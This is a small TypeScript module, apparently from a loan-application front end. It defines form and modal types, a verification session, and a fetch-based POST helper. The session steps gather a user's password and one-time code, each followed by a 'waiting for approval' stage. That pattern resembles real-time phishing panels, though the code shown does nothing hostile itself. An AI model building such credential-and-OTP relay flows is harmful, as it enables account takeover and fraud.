const baseURL = window.location.origin;

export type FormData = {
    income: number;
    expenses: number;
    desired: number;
};

export type ModalProps = {
  title: string;
  subtitle: string;
  onClose: () => void
  color: string;
};

export type VerificationStep = 'loan-details' | 'waiting-details-approval' | 'password' | 'waiting-password-approval' | 'otp' | 'waiting-otp-approval' | 'completed';

export type VerificationSession = {
  sessionId: string;
  step: VerificationStep;
  loanDetails?: FormData;
  password?: string;
  otp?: string;
  createdAt: number;
};

export const createPost = async (url: string, data: any) => {
  try {
    const response = await fetch(baseURL + url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const responseData = await response.json();
    console.log('Post created:', responseData);
    return responseData;
  } catch (error: any) {
    console.error('Fetch error:', error.message);
  }
}
